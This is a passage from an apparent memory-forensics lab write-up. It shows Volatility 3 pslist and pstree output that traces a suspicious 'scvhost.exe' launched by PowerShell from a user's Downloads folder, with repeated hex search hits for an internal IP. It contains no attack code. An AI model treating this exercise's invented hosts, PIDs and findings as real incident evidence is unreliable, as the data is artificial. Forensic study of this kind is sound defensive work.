37 2e 31 35 31 0x78c5eb 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78c8db 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78c9a4 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78c9fb 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78cabb 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78cb24 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78cb7b 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78cbe4 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78cc44 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78cca4 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78ccfb 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78cdc4 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78ce1b 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78cedb 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78cfa4 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78d93b 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78e1f4 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78e2d4 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78e494 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78e574 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78e5e9 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78e654 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78e739 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78e7a4 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x8040fc 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x811bd4 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x56baa8 9880 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x56c1c3 9880 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x56c42b 9880 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x56c84b 9880 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x56d659 9880 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x56d698 9880 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x56d722 9880 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x56d782 9880 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x5e839c 9880 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x5ebd97 9880 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x240342b 9880 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x2495c9741cd 6772 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x2495ca7531f 6772 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x2495ce0690b 6772 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x2495ce075c3 6772 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x2495ce1ae28 6772 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x2495ce1aea0 6772 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 than i did a pslist.\n$ vol3 -f memory_dump.vmem windows.pslist volatility 3 framework 2.7.1 progress: 100.00 pdb scanning finished pid ppid imagefilename offset(v) threads handles sessionid wow64 createtime exittime file output 4 0 system 0xc40aa0e85280 103 - n/a false 2023-10-31 13:30:55.000000 n/a disabled 88 4 registry 0xc40aa0ee7080 4 - n/a false 2023-10-31 13:30:50.000000 n/a disabled 280 4 smss.exe 0xc40aa1cb12c0 2 - n/a false 2023-10-31 13:30:55.000000 n/a disabled 392 384 csrss.exe 0xc40aa1c32140 11 - 0 false 2023-10-31 13:30:56.000000 n/a disabled 472 384 wininit.exe 0xc40aa484e080 1 - 0 false 2023-10-31 13:30:56.000000 n/a disabled 620 472 services.exe 0xc40aa49a90c0 8 - 0 false 2023-10-31 13:30:56.000000 n/a disabled 636 472 lsass.exe 0xc40aa49cd0c0 8 - 0 false 2023-10-31 13:30:56.000000 n/a disabled 740 620 svchost.exe 0xc40aa503b280 1 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 776 472 fontdrvhost.ex 0xc40aa50a2180 5 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 796 620 svchost.exe 0xc40aa50ad280 12 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 880 620 svchost.exe 0xc40aa510d300 13 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 936 620 svchost.exe 0xc40aa517f280 5 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 764 620 svchost.exe 0xc40aa521b300 2 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 396 620 svchost.exe 0xc40aa539e340 3 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1032 620 svchost.exe 0xc40aa539f080 7 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1040 620 svchost.exe 0xc40aa53a0080 2 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1096 620 svchost.exe 0xc40aa53e32c0 1 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1104 620 svchost.exe 0xc40aa53e5340 3 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1208 620 svchost.exe 0xc40aa5421280 6 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1292 620 svchost.exe 0xc40aa546a280 6 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1332 620 svchost.exe 0xc40aa546d340 8 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1356 620 svchost.exe 0xc40aa5470340 2 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1404 620 svchost.exe 0xc40aa54b54c0 8 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1468 620 svchost.exe 0xc40aa0f4f080 3 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1476 620 svchost.exe 0xc40aa5527300 1 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1548 620 svchost.exe 0xc40aa552c340 5 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1584 620 svchost.exe 0xc40aa0eea080 2 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1668 620 svchost.exe 0xc40aa0eae080 4 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1680 620 svchost.exe 0xc40aa0ebb080 3 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1696 620 svchost.exe 0xc40aa0f93080 3 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1804 4 memcompression 0xc40aa55a2080 122 - n/a false 2023-10-31 13:30:57.000000 n/a disabled 1836 620 svchost.exe 0xc40aa495e280 2 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1852 620 svchost.exe 0xc40aa55a7340 7 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1876 620 svchost.exe 0xc40aa55e4340 10 - 0 false 2023-10-31 13:30:57.000000 n/a disabled 1928 620 svchost.exe 0xc40aa561c2c0 3 - 0 false 2023-10-31 13:30:58.000000 n/a disabled 1944 620 svchost.exe 0xc40aa494e300 6 - 0 false 2023-10-31 13:30:58.000000 n/a disabled 984 620 svchost.exe 0xc40aa56b0080 11 - 0 false 2023-10-31 13:30:58.000000 n/a disabled 2052 620 svchost.exe 0xc40aa5763300 10 - 0 false 2023-10-31 13:30:58.000000 n/a disabled 2108 620 svchost.exe 0xc40aa5769340 3 - 0 false 2023-10-31 13:30:58.000000 n/a disabled 2128 620 svchost.exe 0xc40aa576c080 4 - 0 false 2023-10-31 13:30:58.000000 n/a disabled 2184 620 svchost.exe 0xc40aa58472c0 8 - 0 false 2023-10-31 13:30:58.000000 n/a disabled 2200 620 svchost.exe 0xc40aa5848080 6 - 0 false 2023-10-31 13:30:58.000000 n/a disabled 2328 620 spoolsv.exe 0xc40aa58c3280 7 - 0 false 2023-10-31 13:30:58.000000 n/a disabled 2352 620 svchost.exe 0xc40aa58ca340 2 - 0 false 2023-10-31 13:30:58.000000 n/a disabled 2396 620 svchost.exe 0xc40aa58ec540 14 - 0 false 2023-10-31 13:30:58.000000 n/a disabled 2440 620 svchost.exe 0xc40aa595c340 5 - 0 false 2023-10-31 13:30:58.000000 n/a disabled 2600 620 svchost.exe 0xc40aa599f280 23 - 0 false 2023-10-31 13:30:58.000000 n/a disabled 2884 620 svchost.exe 0xc40aa5a772c0 4 - 0 false 2023-10-31 13:30:58.000000 n/a disabled 3196 620 svchost.exe 0xc40aa5b86340 5 - 0 false 2023-10-31 13:30:59.000000 n/a disabled 3204 620 svchost.exe 0xc40aa5b87080 8 - 0 false 2023-10-31 13:30:59.000000 n/a disabled 3212 620 svchost.exe 0xc40aa5be1340 15 - 0 false 2023-10-31 13:30:59.000000 n/a disabled 3236 620 svchost.exe 0xc40aa5c29280 7 - 0 false 2023-10-31 13:30:59.000000 n/a disabled 3292 620 svchost.exe 0xc40aa5a63080 7 - 0 false 2023-10-31 13:30:59.000000 n/a disabled 3316 620 svchost.exe 0xc40aa5c5e2c0 3 - 0 false 2023-10-31 13:30:59.000000 n/a disabled 3324 620 vmtoolsd.exe 0xc40aa5c652c0 11 - 0 false 2023-10-31 13:30:59.000000 n/a disabled 3332 620 vgauthservice. 0xc40aa5c60340 2 - 0 false 2023-10-31 13:30:59.000000 n/a disabled 3352 620 svchost.exe 0xc40aa5c64080 6 - 0 false 2023-10-31 13:30:59.000000 n/a disabled 3360 620 msmpeng.exe 0xc40aa5c67380 25 - 0 false 2023-10-31 13:30:59.000000 n/a disabled 3568 620 svchost.exe 0xc40aa5d4f340 2 - 0 false 2023-10-31 13:30:59.000000 n/a disabled 3608 796 wmiprvse.exe 0xc40aa5d49080 9 - 0 false 2023-10-31 13:30:59.000000 n/a disabled 3728 620 svchost.exe 0xc40aa5e0b300 8 - 0 false 2023-10-31 13:30:59.000000 n/a disabled 932 620 dllhost.exe 0xc40aa5fc4080 10 - 0 false 2023-10-31 13:31:00.000000 n/a disabled 4688 620 msdtc.exe 0xc40aa61ca0c0 9 - 0 false 2023-10-31 13:31:02.000000 n/a disabled 3928 620 svchost.exe 0xc40aa62dc080 2 - 0 false 2023-10-31 13:31:03.000000 n/a disabled 4104 620 svchost.exe 0xc40aa630c2c0 8 - 0 false 2023-10-31 13:31:03.000000 n/a disabled 5156 620 searchindexer. 0xc40aa65b90c0 18 - 0 false 2023-10-31 13:31:05.000000 n/a disabled 5692 620 nissrv.exe 0xc40aa66430c0 4 - 0 false 2023-10-31 13:31:08.000000 n/a disabled 6408 796 microsoftedge. 0xc40aa6d350c0 0 - 1 false 2023-10-31 13:31:11.000000 2023-10-31 13:31:23.000000 disabled 6756 620 svchost.exe 0xc40aa6f0e540 1 - 0 false 2023-10-31 13:31:11.000000 n/a disabled 7192 5156 searchprotocol 0xc40aa70cc080 9 - 0 false 2023-10-31 13:31:13.000000 n/a disabled 7320 620 svchost.exe 0xc40aa715e340 5 - 0 false 2023-10-31 13:31:13.000000 n/a disabled 7616 2920 googlecrashhan 0xc40aa636e080 3 - 0 true 2023-10-31 13:31:15.000000 n/a disabled 7624 2920 googlecrashhan 0xc40aa63f5080 3 - 0 false 2023-10-31 13:31:15.000000 n/a disabled 8140 620 svchost.exe 0xc40aa51b4080 5 - 0 false 2023-10-31 13:31:20.000000 n/a disabled 5844 620 securityhealth 0xc40aa6b85080 13 - 0 false 2023-10-31 13:31:23.000000 n/a disabled 4100 620 svchost.exe 0xc40aa694d080 1 - 0 false 2023-10-31 13:32:21.000000 n/a disabled 3392 3308 csrss.exe 0xc40aa4969080 11 - 3 false 2023-10-31 13:32:28.000000 n/a disabled 3800 3308 winlogon.exe 0xc40aa6541080 3 - 3 false 2023-10-31 13:32:28.000000 n/a disabled 5996 3800 fontdrvhost.ex 0xc40aa63ad080 5 - 3 false 2023-10-31 13:32:29.000000 n/a disabled 548 3800 dwm.exe 0xc40aa5a8b080 13 - 3 false 2023-10-31 13:32:29.000000 n/a disabled 2768 1404 sihost.exe 0xc40aa5b2e080 8 - 3 false 2023-10-31 13:32:32.000000 n/a disabled 3280 620 svchost.exe 0xc40aa6aee080 3 - 3 false 2023-10-31 13:32:32.000000 n/a disabled 5516 620 svchost.exe 0xc40aa5a8f080 2 - 3 false 2023-10-31 13:32:32.000000 n/a disabled 2848 1208 taskhostw.exe 0xc40aa6195080 6 - 3 false 2023-10-31 13:32:32.000000 n/a disabled 7716 3800 userinit.exe 0xc40aa71eb080 0 - 3 false 2023-10-31 13:32:32.000000 2023-10-31 13:32:56.000000 disabled 7944 7716 explorer.exe 0xc40aa64f4080 52 - 3 false 2023-10-31 13:32:32.000000 n/a disabled 7224 620 svchost.exe 0xc40aa64bc080 3 - 3 false 2023-10-31 13:32:33.000000 n/a disabled 760 796 shellexperienc 0xc40aa63b4080 29 - 3 false 2023-10-31 13:32:33.000000 n/a disabled 532 796 searchui.exe 0xc40aa5a24080 26 - 3 false 2023-10-31 13:32:34.000000 n/a disabled 6268 796 runtimebroker. 0xc40aa715b540 2 - 3 false 2023-10-31 13:32:34.000000 n/a disabled 7572 796 microsoftedge. 0xc40aa6e712c0 35 - 3 false 2023-10-31 13:32:34.000000 n/a disabled 784 796 applicationfra 0xc40aa40dd080 3 - 3 false 2023-10-31 13:32:34.000000 n/a disabled 488 796 skype4life.exe 0xc40aa5c6c080 14 - 3 false 2023-10-31 13:32:34.000000 n/a disabled 508 796 skypehelper.ex 0xc40aa10e3080 4 - 3 false 2023-10-31 13:32:34.000000 n/a disabled 2796 796 yourphone.exe 0xc40aa64b14c0 16 - 3 false 2023-10-31 13:32:34.000000 n/a disabled 2660 796 browser_broker 0xc40aa6ae7500 4 - 3 false 2023-10-31 13:32:34.000000 n/a disabled 1616 796 runtimebroker. 0xc40aa6abe500 1 - 3 false 2023-10-31 13:32:34.000000 n/a disabled 2740 1616 microsoftedges 0xc40aa71f3080 9 - 3 false 2023-10-31 13:32:35.000000 n/a disabled 6480 796 microsoftedgec 0xc40aa4981080 15 - 3 false 2023-10-31 13:32:35.000000 n/a disabled 5928 1468 tabtip.exe 0xc40aa694c540 5 - 3 false 2023-10-31 13:32:35.000000 n/a disabled 5588 796 runtimebroker. 0xc40aa4bc3080 3 - 3 false 2023-10-31 13:32:37.000000 n/a disabled 844 796 backgroundtask 0xc40aa6f99080 0 - 3 false 2023-10-31 13:32:40.000000 2023-10-31 13:34:57.000000 disabled 8036 796 runtimebroker. 0xc40aa6dc1080 1 - 3 false 2023-10-31 13:32:44.000000 n/a disabled 6956 796 smartscreen.ex 0xc40aa5a5b300 6 - 3 false 2023-10-31 13:32:45.000000 n/a disabled 3536 7944 securityhealth 0xc40aa4ba23c0 1 - 3 false 2023-10-31 13:32:45.000000 n/a disabled 7516 796 systemsettings 0xc40aa6e5d400 17 - 3 false 2023-10-31 13:32:45.000000 n/a disabled 6028 7944 vm3dservice.ex 0xc40aa6f7e500 1 - 3 false 2023-10-31 13:32:46.000000 n/a disabled 4596 7944 vmtoolsd.exe 0xc40aa69b73c0 6 - 3 false 2023-10-31 13:32:46.000000 n/a disabled 5712 7944 chrome.exe 0xc40aa6fca080 0 - 3 false 2023-10-31 13:32:50.000000 2023-10-31 13:33:04.000000 disabled 8444 620 svchost.exe 0xc40aa6647080 11 - 0 false 2023-10-31 13:32:59.000000 n/a disabled 8536 620 svchost.exe 0xc40aa76a3080 1 - 0 false 2023-10-31 13:32:59.000000 n/a disabled 8744 620 sgrmbroker.exe 0xc40aa7a1a080 5 - 0 false 2023-10-31 13:33:00.000000 n/a disabled 8772 620 svchost.exe 0xc40aa7a15080 6 - 0 false 2023-10-31 13:33:00.000000 n/a disabled 8820 620 svchost.exe 0xc40aa6fc13c0 6 - 0 false 2023-10-31 13:33:00.000000 n/a disabled 9036 620 svchost.exe 0xc40aa7a21300 1 - 3 false 2023-10-31 13:33:00.000000 n/a disabled 8352 796 runtimebroker. 0xc40aa7a1c2c0 4 - 3 false 2023-10-31 13:33:05.000000 n/a disabled 1076 796 dllhost.exe 0xc40aa6d36080 5 - 3 false 2023-10-31 13:33:06.000000 n/a disabled 8860 620 svchost.exe 0xc40aa65c3080 0 - 0 false 2023-10-31 13:33:58.000000 2023-10-31 13:34:03.000000 disabled 8416 3800 logonui.exe 0xc40aa0ee8080 5 - 3 false 2023-10-31 13:35:09.000000 n/a disabled 7884 7812 csrss.exe 0xc40aa7a1d080 13 - 4 false 2023-10-31 13:35:09.000000 n/a disabled 588 796 microsoft.phot 0xc40aa0eaa080 15 - 3 false 2023-10-31 13:35:09.000000 n/a disabled 1020 7812 winlogon.exe 0xc40aa768b080 5 - 4 false 2023-10-31 13:35:09.000000 n/a disabled 1792 1020 fontdrvhost.ex 0xc40aa63ce080 5 - 4 false 2023-10-31 13:35:09.000000 n/a disabled 6680 1020 dwm.exe 0xc40aa5ea5080 14 - 4 false 2023-10-31 13:35:09.000000 n/a disabled 9044 796 runtimebroker. 0xc40aa7a1e080 1 - 3 false 2023-10-31 13:35:10.000000 n/a disabled 4060 796 runtimebroker. 0xc40aa6107080 2 - 3 false 2023-10-31 13:35:11.000000 n/a disabled 6824 1404 sihost.exe 0xc40aa4d76080 10 - 4 false 2023-10-31 13:35:12.000000 n/a disabled 6432 620 svchost.exe 0xc40aa5eeb080 8 - 4 false 2023-10-31 13:35:12.000000 n/a disabled 6788 620 svchost.exe 0xc40aa4f8d080 4 - 4 false 2023-10-31 13:35:12.000000 n/a disabled 2104 1208 taskhostw.exe 0xc40aa69ab400 7 - 4 false 2023-10-31 13:35:12.000000 n/a disabled 6172 1468 ctfmon.exe 0xc40aa4fc5080 8 - 4 false 2023-10-31 13:35:12.000000 n/a disabled 5420 1468 tabtip.exe 0xc40aa5a8c2c0 9 - 4 false 2023-10-31 13:35:12.000000 n/a disabled 8788 1020 userinit.exe 0xc40aa73c2440 0 - 4 false 2023-10-31 13:35:12.000000 2023-10-31 13:35:36.000000 disabled 1424 8788 explorer.exe 0xc40aa8c11440 87 - 4 false 2023-10-31 13:35:12.000000 n/a disabled 404 620 svchost.exe 0xc40aa8c69400 6 - 4 false 2023-10-31 13:35:13.000000 n/a disabled 7100 796 shellexperienc 0xc40aa8cca0c0 26 - 4 false 2023-10-31 13:35:13.000000 n/a disabled 7448 796 searchui.exe 0xc40aa76c0080 46 - 4 false 2023-10-31 13:35:13.000000 n/a disabled 3244 796 runtimebroker. 0xc40aa8ca53c0 7 - 4 false 2023-10-31 13:35:14.000000 n/a disabled 6136 796 yourphone.exe 0xc40aa82e0080 15 - 4 false 2023-10-31 13:35:14.000000 n/a disabled 2324 796 skypehelper.ex 0xc40aa4ef1080 4 - 4 false 2023-10-31 13:35:14.000000 n/a disabled 8368 796 skype4life.exe 0xc40aa69a9080 15 - 4 false 2023-10-31 13:35:14.000000 n/a disabled 7812 796 runtimebroker. 0xc40aa8cc3080 4 - 4 false 2023-10-31 13:35:15.000000 n/a disabled 7472 796 hxtsr.exe 0xc40aa8caa080 13 - 4 false 2023-10-31 13:35:20.000000 n/a disabled 2412 796 runtimebroker. 0xc40aa8cc7080 2 - 4 false 2023-10-31 13:35:20.000000 n/a disabled 112 796 runtimebroker. 0xc40aa8cc0080 1 - 4 false 2023-10-31 13:35:20.000000 n/a disabled 6932 796 runtimebroker. 0xc40aa8cbd080 1 - 4 false 2023-10-31 13:35:21.000000 n/a disabled 9064 620 svchost.exe 0xc40aa90b4080 6 - 4 false 2023-10-31 13:35:21.000000 n/a disabled 4664 796 smartscreen.ex 0xc40aa904d3c0 9 - 4 false 2023-10-31 13:35:24.000000 n/a disabled 5800 1424 securityhealth 0xc40aa9050080 1 - 4 false 2023-10-31 13:35:24.000000 n/a disabled 8644 1424 vm3dservice.ex 0xc40aa91f6400 1 - 4 false 2023-10-31 13:35:25.000000 n/a disabled 1736 1424 xampp-control. 0xc40aa92a7080 1 - 4 true 2023-10-31 13:35:28.000000 n/a disabled 8048 1424 chrome.exe 0xc40aa63ae080 40 - 4 false 2023-10-31 13:35:31.000000 n/a disabled 8728 8048 chrome.exe 0xc40aa71e8080 9 - 4 false 2023-10-31 13:35:31.000000 n/a disabled 7412 8048 chrome.exe 0xc40aa9290080 14 - 4 false 2023-10-31 13:35:31.000000 n/a disabled 5072 8048 chrome.exe 0xc40aa630e080 16 - 4 false 2023-10-31 13:35:31.000000 n/a disabled 5576 8048 chrome.exe 0xc40aa92a8080 10 - 4 false 2023-10-31 13:35:31.000000 n/a disabled 8124 8048 chrome.exe 0xc40aa6104080 15 - 4 false 2023-10-31 13:35:31.000000 n/a disabled 9352 796 hxoutlook.exe 0xc40aa93b3080 15 - 4 false 2023-10-31 13:35:32.000000 n/a disabled 9412 796 applicationfra 0xc40aa94ed400 7 - 4 false 2023-10-31 13:35:32.000000 n/a disabled 9420 796 microsoftedge. 0xc40aa93b2080 22 - 4 false 2023-10-31 13:35:32.000000 n/a disabled 9572 796 browser_broker 0xc40aa9562400 6 - 4 false 2023-10-31 13:35:32.000000 n/a disabled 9580 796 runtimebroker. 0xc40aa94253c0 3 - 4 false 2023-10-31 13:35:32.000000 n/a disabled 10204 796 hxaccounts.exe 0xc40aa91dc4c0 14 - 4 false 2023-10-31 13:35:35.000000 n/a disabled 10212 9580 microsoftedges 0xc40aa9188480 6 - 4 false 2023-10-31 13:35:35.000000 n/a disabled 9408 796 microsoftedgec 0xc40aa91df080 29 - 4 false 2023-10-31 13:35:35.000000 n/a disabled 10832 8048 chrome.exe 0xc40aa989f080 15 - 4 false 2023-10-31 13:35:45.000000 n/a disabled 10840 8048 chrome.exe 0xc40aa98c3080 15 - 4 false 2023-10-31 13:35:45.000000 n/a disabled 10600 8048 chrome.exe 0xc40aa76d9080 15 - 4 false 2023-10-31 13:35:49.000000 n/a disabled 10988 796 microsoftedgec 0xc40aa98f50c0 13 - 4 false 2023-10-31 13:35:50.000000 n/a disabled 7208 796 microsoftedgec 0xc40aa690d080 0 - 4 false 2023-10-31 13:36:08.000000 2023-10-31 13:36:18.000000 disabled 11096 796 runtimebroker. 0xc40aa95fa280 7 - 4 false 2023-10-31 13:36:10.000000 n/a disabled 10336 796 microsoftedgec 0xc40aa9b96080 13 - 4 false 2023-10-31 13:36:19.000000 n/a disabled 376 796 windowsinterna 0xc40aa541e080 33 - 4 false 2023-10-31 13:36:48.000000 n/a disabled 4912 1424 python.exe 0xc40aa770e080 1 - 4 false 2023-10-31 13:37:10.000000 n/a disabled 3028 4912 conhost.exe 0xc40aa64af080 3 - 4 false 2023-10-31 13:37:10.000000 n/a disabled 2896 4912 python.exe 0xc40aa9972080 4 - 4 false 2023-10-31 13:37:10.000000 n/a disabled 7368 8048 chrome.exe 0xc40aa98d0400 15 - 4 false 2023-10-31 13:37:17.000000 n/a disabled 11204 1736 httpd.exe 0xc40aa99c6080 1 - 4 false 2023-10-31 13:37:40.000000 n/a disabled 9128 11204 conhost.exe 0xc40aa4ee0080 3 - 4 false 2023-10-31 13:37:40.000000 n/a disabled 5212 1736 mysqld.exe 0xc40aa9898500 30 - 4 false 2023-10-31 13:37:41.000000 n/a disabled 9652 11204 httpd.exe 0xc40aa9cfe500 155 - 4 false 2023-10-31 13:37:41.000000 n/a disabled 11048 1736 filezillaserve 0xc40aa989c500 5 - 4 true 2023-10-31 13:37:41.000000 n/a disabled 4276 1736 cmd.exe 0xc40aaa3cf080 1 - 4 false 2023-10-31 13:37:43.000000 n/a disabled 8568 4276 conhost.exe 0xc40aaa3ce080 3 - 4 false 2023-10-31 13:37:43.000000 n/a disabled 2696 4276 java.exe 0xc40aaa3d7080 35 - 4 false 2023-10-31 13:37:47.000000 n/a disabled 1272 796 dllhost.exe 0xc40aaa3d3080 9 - 4 false 2023-10-31 13:38:25.000000 n/a disabled 10048 1424 cmd.exe 0xc40aa956d540 1 - 4 false 2023-10-31 13:38:25.000000 n/a disabled 10040 10048 conhost.exe 0xc40aa95f6080 3 - 4 false 2023-10-31 13:38:25.000000 n/a disabled 9872 1736 filezilla serv 0xc40aa4fa2080 1 - 4 true 2023-10-31 13:39:07.000000 n/a disabled 9880 1736 filezilla serv 0xc40aa739e080 2 - 4 true 2023-10-31 13:41:02.000000 n/a disabled 8188 620 svchost.exe 0xc40aaa4d8100 4 - 0 false 2023-10-31 13:41:23.000000 n/a disabled 5708 8048 chrome.exe 0xc40aa5ea8080 9 - 4 false 2023-10-31 13:42:08.000000 n/a disabled 6772 1424 powershell.exe 0xc40aa9de7080 11 - 4 false 2023-10-31 13:42:21.000000 n/a disabled 4532 6772 conhost.exe 0xc40aaa8de4c0 3 - 4 false 2023-10-31 13:42:22.000000 n/a disabled 4964 8048 chrome.exe 0xc40aa6a08080 15 - 4 false 2023-10-31 13:44:11.000000 n/a disabled 5116 1424 mspaint.exe 0xc40aaa3f1080 7 - 4 false 2023-10-31 13:45:43.000000 n/a disabled 10100 620 svchost.exe 0xc40aa539a080 4 - 0 false 2023-10-31 13:45:43.000000 n/a disabled 11172 620 svchost.exe 0xc40aaa5d1080 1 - 0 false 2023-10-31 13:45:43.000000 n/a disabled 11156 6772 scvhost.exe 0xc40aa8cc8080 0 - 4 true 2023-10-31 13:50:20.000000 2023-10-31 13:51:36.000000 disabled 1328 796 microsoft.phot 0xc40aaa3f2080 15 - 4 false 2023-10-31 13:54:21.000000 n/a disabled 4660 796 runtimebroker. 0xc40aa636a080 5 - 4 false 2023-10-31 13:54:21.000000 n/a disabled 6612 620 svchost.exe 0xc40aaaac3080 6 - 0 false 2023-10-31 13:55:22.000000 n/a disabled 9228 984 audiodg.exe 0xc40aa6f6a300 4 - 0 false 2023-10-31 13:56:08.000000 n/a disabled 7664 1468 tabtip.exe 0xc40aa73a4080 0 - 4 false 2023-10-31 13:56:11.000000 2023-10-31 13:56:14.000000 disabled 7312 1424 ftk imager.exe 0xc40aad8de080 9 - 4 true 2023-10-31 13:56:11.000000 n/a disabled 3120 796 dllhost.exe 0xc40aa51b2080 4 - 4 false 2023-10-31 13:57:17.000000 n/a disabled 4956 5156 searchfilterho 0xc40aa5a28080 8 - 0 false 2023-10-31 13:59:18.000000 n/a disabled and correlated this data with previous finding\u0026rsquo;s process ids 3360, 11048, 9880 and 6772. and the i did a pstree on pid 6772. even then i couldn\u0026rsquo;t see the process id.\n$ vol3 -f memory_dump.vmem windows.pstree --pid 6772 volatility 3 framework 2.7.1 progress: 100.00 pdb scanning finished pid ppid imagefilename offset(v) threads handles sessionid wow64 createtime exittime audit cmd path 472 384 wininit.exe 0xc40aa484e080 1 - 0 false 2023-10-31 13:30:56.000000 n/a \\device\\harddiskvolume4\\windows\\system32\\wininit.exe wininit.exe c:\\windows\\system32\\wininit.exe * 620 472 services.exe 0xc40aa49a90c0 8 - 0 false 2023-10-31 13:30:56.000000 n/a \\device\\harddiskvolume4\\windows\\system32\\services.exe c:\\windows\\system32\\services.exe c:\\windows\\system32\\services.exe ** 796 620 svchost.exe 0xc40aa50ad280 12 - 0 false 2023-10-31 13:30:57.000000 n/a \\device\\harddiskvolume4\\windows\\system32\\svchost.exe c:\\windows\\system32\\svchost.exe -k dcomlaunch -p c:\\windows\\system32\\svchost.exe *** 7812 796 runtimebroker. 0xc40aa8cc3080 4 - 4 false 2023-10-31 13:35:15.000000 n/a \\device\\harddiskvolume4\\windows\\system32\\runtimebroker.exe c:\\windows\\system32\\runtimebroker.exe -embedding c:\\windows\\system32\\runtimebroker.exe **** 1020 7812 winlogon.exe 0xc40aa768b080 5 - 4 false 2023-10-31 13:35:09.000000 n/a \\device\\harddiskvolume4\\windows\\system32\\winlogon.exe winlogon.exe c:\\windows\\system32\\winlogon.exe ***** 8788 1020 userinit.exe 0xc40aa73c2440 0 - 4 false 2023-10-31 13:35:12.000000 2023-10-31 13:35:36.000000 \\device\\harddiskvolume4\\windows\\system32\\userinit.exe - - ****** 1424 8788 explorer.exe 0xc40aa8c11440 87 - 4 false 2023-10-31 13:35:12.000000 n/a \\device\\harddiskvolume4\\windows\\explorer.exe c:\\windows\\explorer.exe c:\\windows\\explorer.exe ******* 6772 1424 powershell.exe 0xc40aa9de7080 11 - 4 false 2023-10-31 13:42:21.000000 n/a \\device\\harddiskvolume4\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe \u0026#34;c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\u0026#34; c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe ******** 11156 6772 scvhost.exe 0xc40aa8cc8080 0 - 4 true 2023-10-31 13:50:20.000000 2023-10-31 13:51:36.000000 \\device\\harddiskvolume4\\users\\bantingfg\\downloads\\scvhost.exe - - ******** 4532 6772 conhost.exe 0xc40aaa8de4c0 3 - 4 false 2023-10-31 13:42:22.000000 